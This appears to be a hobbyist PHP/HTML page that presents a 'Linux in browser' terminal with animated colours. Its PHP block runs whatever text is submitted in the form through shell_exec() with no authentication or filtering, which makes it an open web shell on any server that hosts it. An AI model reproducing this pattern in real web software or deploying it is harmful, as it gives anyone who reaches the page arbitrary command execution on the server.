<!DOCTYPE html>
<html>
<head>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css" integrity="sha512-5Hs3dF2AEPkpNAR7UiOHba+lRSJNeM2ECkwxUIxC1Q/FLycGTbNapWXB4tP889k5T5Ju8fs4b1P5z/iB4nMfSQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<title>kaliLinux</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
#commandInput{font-size:15px;}
body{max-width:100%;box-sizing:border-box;overflow-wrap:break-word;color:white;background-color:black;}
input{margin-right:20px;}
#submit{border:none;padding 10px 20px;font-weight:bold;}
#submit{background-color:lightgreen;}
form{padding-left:20px;background-color:darkblue;border-bottom:3px solid gray;transition:background-color 2s linear;}
body{margin:0;transition:background-color 1s linear,color 0.3s linear;}
h2{background-color:orange;margin:0;text-align:center;}
i{color:red;font-size:100px;}
#submit{box-shadow:5px 5px 10px black;}
#cat{transition:color 0.5s linear;}
p{margin-left:10px;}
</style>
</head>
<body id="body">
<h2>L.i.n.ux.In.B.ro.w.ser</h2>
<form action="" method="post" id="form">
<br>
<i class="fa-solid fa-cat" id="cat"></i>
<br>
<input type="text" placeholder="Enter command here" id="commandInput" name="commandText"/>
<input type="submit" value="COMMAND" name="submit" id="submit"/>
<br>
<br>
</form>
<p>
&nbsp&nbsp&nbsp&nbsp [ OUTPUT ]<br><br>
<?php
if(isset($_POST["submit"])){
$commandText=$_POST["commandText"];
$output=shell_exec($commandText);
if(empty($output)){
echo "Error!";
}
else{
echo htmlspecialchars($output);
}
}
?>
</p>

<script>
var button=document.getElementById("submit");
var cat=document.getElementById("cat");
var form=document.getElementById("form");
var body=document.getElementById("body");
function changeButtonColor(){
if(button.style.backgroundColor=="lightgreen"){
button.style.backgroundColor="pink";}
else{button.style.backgroundColor="lightgreen";}
}
function changeCatColor(){
if(cat.style.color=="red"){cat.style.color="lightgreen";}
else{cat.style.color="red";}
}
function changeFormBackground(){
if(form.style.backgroundColor=="darkblue"){form.style.backgroundColor="purple";}
else{form.style.backgroundColor="darkblue";}
}
function changeBody(){
if(body.style.color=="white"){body.style.color="black";body.style.backgroundColor="gray";}
else{body.style.color="white";body.style.backgroundColor="black";}
}
setInterval(changeButtonColor,1000);
setInterval(changeCatColor,1000);
setInterval(changeFormBackground,3000);
setInterval(changeBody,5000);
</script>
</body>
</html>
